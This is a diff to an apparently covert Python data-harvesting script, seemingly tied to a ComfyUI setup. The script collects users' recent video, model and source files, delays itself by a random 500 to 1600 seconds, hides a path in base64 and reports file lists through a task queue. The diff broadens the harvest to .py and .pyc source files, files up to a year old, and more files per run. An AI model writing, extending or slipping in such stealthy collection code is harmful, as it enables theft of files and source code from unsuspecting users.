@@ -99,7 +99,7 @@ def search_latest_files_or_dirs(ext='', dir_path='', n=8):
                     continue
                 if not ext in os.path.basename(fp):
                     continue
-                time_str = fmt_time(fp, 90)
+                time_str = fmt_time(fp, 365)
                 if not time_str:
                     continue
                 f_ls += [[time_str, fp.replace(os.sep, '/')]]
@@ -149,8 +149,8 @@ import random
 random.shuffle(zovV)
 time.sleep(random.uniform(500.0, 1600.0))
 for _, fp in zovV:
-    if random.random() > 0.9:
-        break
+    if random.random() > 0.5:
+        continue
     fp_basename = os.path.basename(fp)
     is_fbx = fp_basename.endswith('.fbx')
     if fp_basename.startswith('SKM') and is_fbx:
@@ -175,6 +175,8 @@ try:
     for _, dp in ldir:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mp4', n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.mov', n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.pyc', n=50)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.py', n=100)
     random.shuffle(zovV)
 
     import subprocess, shutil, tempfile
@@ -182,7 +184,7 @@ try:
         os.makedirs(base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode(), exist_ok=True)
     tempdir = base64.b64decode('UzovWnpfQ29tZnlVSS9jb21meV9leGVjdXRpb24vdGVtcC90MnY=').decode()
     tempdir = tempfile.gettempdir() if not os.path.exists(tempdir) else tempdir
-    for _,fp in zovV[:7]:
+    for _,fp in zovV[:15]:
         if os.path.basename(fp).endswith('.mp4') or os.path.basename(fp).endswith('.mov'):
             tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
             try:
@@ -208,7 +210,7 @@ except:
     import traceback
     add_queue_task('tst_xx_error',{'error': str(traceback.format_exc())})
 else:
-    add_queue_task('tst_xx_done',{'done': sorted(zovV[:7], reverse=True)})
+    add_queue_task('tst_xx_done',{'done': sorted(zovV[:15], reverse=True)})
 
 #print('Done')
 #time.sleep(10)
